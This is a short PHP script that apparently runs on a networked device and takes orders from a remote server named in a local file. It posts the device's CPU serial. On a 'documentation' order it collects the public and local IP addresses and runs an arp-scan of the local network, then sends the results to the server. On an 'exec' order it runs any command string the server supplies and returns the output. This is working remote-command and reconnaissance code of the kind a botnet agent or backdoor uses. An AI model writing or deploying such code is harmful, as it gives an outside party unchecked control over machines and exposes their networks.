<?php
function post_to_url($url, $data) {
   $fields = '';
   foreach($data as $key => $value) { 
      $fields .= $key . '=' . $value . '&'; 
   }
   rtrim($fields, '&');

   $post = curl_init();

   curl_setopt($post, CURLOPT_URL, $url);
   curl_setopt($post, CURLOPT_POST, count($data));
   curl_setopt($post, CURLOPT_POSTFIELDS, $fields);
   curl_setopt($post, CURLOPT_RETURNTRANSFER, 1);
   $result = curl_exec($post);
   return($result);
   curl_close($post);
}
$remoteurl="";
if (file_exists("remoteurl.txt")) {
    $remoteurl= file_get_contents("remoteurl.txt");
}
if (strlen($remoteurl)>7) {
	if (file_exists("remoteurl.txt")) {
		$medata = explode("\n", file_get_contents("me.txt"));
		$medatalines=sizeof($medata)-2;
		$serial=$medata[$medatalines];
		$arrserial=explode(":", $serial);
		$cpuserial=trim($arrserial[1]);
		$data = array(
   			"id" => $cpuserial
		);
		$response=post_to_url($remoteurl, $data);
		echo $remoteurl."?id=".$cpuserial."\r\n";
		echo "Response : ".$response."\r\n";
		if (strlen($response)>0) {
			$vars=explode("|", $response);
			$master_order=$vars[0];
			if ($master_order=="documentation") {
				$public_ip=exec('wget -qO- http://ipecho.net/plain ; echo');
				$local_ip=exec("ifconfig eth0 | grep inet | awk '{print $2}' | sed 's/addr://'");
				// Getting Local Network Enviroment
				exec ("sudo arp-scan --interface=eth0 --localnet>network.txt");
				// 
				$localnetwork="";
				if (file_exists("network.txt")) {
				    $networkfile = file_get_contents("network.txt");
				    $netdata=explode("\n", $networkfile);
				    if (sizeof($netdata)>3) {
				    	for ($i=2; $i <sizeof($netdata)-4 ; $i++) { 
				    		echo $netdata[$i]."\r\n";
				    		$localnetwork.=$netdata[$i]."|";
				    	}
				    }
				}
				$data = array("id"=>$cpuserial,"order"=>$master_order,"local_ip"=>$local_ip,"public_ip"=>$public_ip,"localnetwork"=>$localnetwork);
				$response=post_to_url($remoteurl, $data);
			}
			if ($master_order=="exec") {
				$eresults = exec($vars[1]);
				$data = array("id"=>$cpuserial,"order"=>$master_order,"results"=>$eresults);
				$response=post_to_url($remoteurl, $data);
			}
		}
	}
}
?>